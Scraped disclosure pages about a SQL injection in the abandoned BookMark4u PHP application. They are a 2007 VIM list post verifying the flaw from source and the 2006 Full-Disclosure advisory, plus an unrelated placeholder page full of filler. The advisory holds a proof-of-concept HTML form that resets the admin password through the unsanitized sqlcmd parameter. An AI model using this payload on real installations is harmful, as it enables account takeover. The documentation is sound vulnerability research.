=== Content from www.attrition.org_bb61fa6e_20250125_203210.html ===

# [VIM] Source verify and clarification of old bookmark4u SQL injection

**Steven M. Christey**
coley at mitre.org

*Thu Feb 22 00:30:19 EST 2007*

* Previous message: [[VIM] Vendor dispute for Animated Smiley Generator RFI (CVE-2006-6541)](001376.html)
* Next message: [[VIM] [true] phpTrafficA-1.4.1 Local File Inclusion](001377.html)
* **Messages sorted by:**
  [[ date ]](date.html#1373)
  [[ thread ]](thread.html#1373)
  [[ subject ]](subject.html#1373)
  [[ author ]](author.html#1373)

---

```

Ref: FULLDISC:20060420 Sql Injection in BookMark4u
URL: <http://marc.theaimsgroup.com/?l=full-disclosure&m=114555163911635&w=2>

1) This is abandonware.  Last version was in 2003 and site says "This
   Project will NOT be updated ANY MORE."  See:
   <http://sourceforge.net/project/showfiles.php?group_id=29784>

2) Some VDB's mention the "mode" parameter being affected, but this
   appears erroneous.  Only mentions of $mode in config.php are:

        $mode   = $HTTP_POST_VARS[mode];
        ...
        if ($mode == 'sqlexec') {

3) sqlcmd vector verified by source inspection:

         $sqlcmd = $HTTP_POST_VARS[sqlcmd];
   ...
   if ($mode == 'sqlexec') {
     if (get_magic_quotes_gpc()) {
       $sqlcmd = ereg_replace("\\\\", "", $sqlcmd);
     }
     $qry = ereg_replace("%NL%", "\n", $sqlcmd); # decode newline(\n) chars
     ...
     $qry_list = explode(";", $qry); # split multiple queries
     for ($i = 0; $i < sizeof($qry_list); $i++) {
       $qry_one = trim($qry_list[$i]);
       if (!$qry_one) continue;
       $adminMgr->executeMiscQuery($qry_one);

   You know the rest.  Bill H will no doubt love the "%NL%" touch.

   At first glance, this didn't seem to require authentication or
   authorization, but I didn't look too close.

4) As might be expected for ancient PHP code, be careful when you look
   at the source, or you might step in some RFI.

- Steve

```

---

* Previous message: [[VIM] Vendor dispute for Animated Smiley Generator RFI (CVE-2006-6541)](001376.html)
* Next message: [[VIM] [true] phpTrafficA-1.4.1 Local File Inclusion](001377.html)
* **Messages sorted by:**
  [[ date ]](date.html#1373)
  [[ thread ]](thread.html#1373)
  [[ subject ]](subject.html#1373)
  [[ author ]](author.html#1373)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)



=== Content from marc.info_cf1e8ac0_20250125_203207.html ===

```
[[prev in list](?l=full-disclosure&m=114555093900124&w=2)] [[next in list](?l=full-disclosure&m=114555708001908&w=2)] [prev in thread] [next in thread]
List:       [full-disclosure](?l=full-disclosure&r=1&w=2)
Subject:    [Full-disclosure] Sql Injection in BookMark4u
From:       ["(M.o.H.a.J.a.L.i)" <mohajali2k4 () gmail ! com>](?a=113019480500001&r=1&w=2)
Date:       [2006-04-20 16:46:43](?l=full-disclosure&r=1&w=2&b=200604)
Message-ID: [470c3dd0604200946m668e0b6aq3135032d65520002 () mail ! gmail ! com](?i=470c3dd0604200946m668e0b6aq3135032d65520002%20()%20mail%20!%20gmail%20!%20com)
[Download RAW [message](?l=full-disclosure&m=114555163911635&q=mbox) or [body](?l=full-disclosure&m=114555163911635&q=raw)]

[[Attachment #2 (multipart/alternative)]](?l=full-disclosure&m=114555163911635&q=p2)

[[Attachment #4 (text/plain)]](?l=full-disclosure&m=114555163911635&q=p4)

site:
<http://bookmark4u.sourceforge.net/>

Hello i found a vulnerability in bookmark4u that u can use to make sql
injections...

the following PoC changes the admin password:
[code]

<form action='<http://bookmark4u.sourceforge.net/v2.0.0/admin/config.php>'
method='post'>
  <tr><td align='center'>
  <input type='hidden' name='sqlcmd' value="# add a administrator
(initial password
is 'test') %NL%UPDATE bk4u_passwd SET  passwd=PASSWORD('asdfg') WHERE
user='admin';">
  <input type='hidden' name='mode' value='sqlexec'>
  <input type='submit' value="Execute Above (administrator's account)">
  </td></tr>
  </form></table>
<br><a href='javascript:document.location.reload();'>And Reload this
page</a>.</body></html>
[/code]

MoHaJaLi

[[Attachment #5 (text/html)]](?l=full-disclosure&m=114555163911635&q=p5)

<div>site:</div>
<div><a onclick="return top.js.OpenExtLink(window,event,this)" \
href="<http://bookmark4u.sourceforge.net/>" \
target="_blank"><http://bookmark4u.sourceforge.net/></a></div> <div>&nbsp;</div>
<div>Hello i found a vulnerability in bookmark4u that u can use to make sql \
injections...</div> <div>&nbsp;</div>
<div>the following PoC changes the admin password:</div>
<div>[code]<br>
<div style="DIRECTION: ltr"><span class="q">
<p>&lt;form action='<a \
href="<http://bookmark4u.sourceforge.net/v2.0.0/admin/config.php>"><http://bookmark4u.sourceforge.net/v2.0.0/admin/config.php></a>' \
method='post'&gt;<br>&nbsp; &lt;tr&gt;&lt;td align='center'&gt;<br>&nbsp; &lt;input \
type='hidden' name='sqlcmd' value=&quot;# add a administrator (initial  \
</p></span>password is 'test') %NL%UPDATE bk4u_passwd SET&nbsp; \
passwd=PASSWORD('asdfg') WHERE <span class="q">user='admin';&quot;&gt;<br>&nbsp; \
&lt;input type='hidden' name='mode' value='sqlexec'&gt;<br>&nbsp; &lt;input \
type='submit' value=&quot;Execute Above (administrator's account)&quot;&gt; \
<br>&nbsp; &lt;/td&gt;&lt;/tr&gt;<br>&nbsp; &lt;/form&gt;&lt;/table&gt; \
<br>&lt;br&gt;&lt;a href='javascript:document.location.reload();'&gt;And Reload this \
page&lt;/a&gt;.&lt;/body&gt;&lt;/html&gt;</span></div><span class="q"></span> </div>
<div>[/code]</div>
<div>&nbsp;</div>
<div>MoHaJaLi</div>
<div>&nbsp;</div>

_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>

[[prev in list](?l=full-disclosure&m=114555093900124&w=2)] [[next in list](?l=full-disclosure&m=114555708001908&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.vupen.com_0023a648_20250125_203211.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61


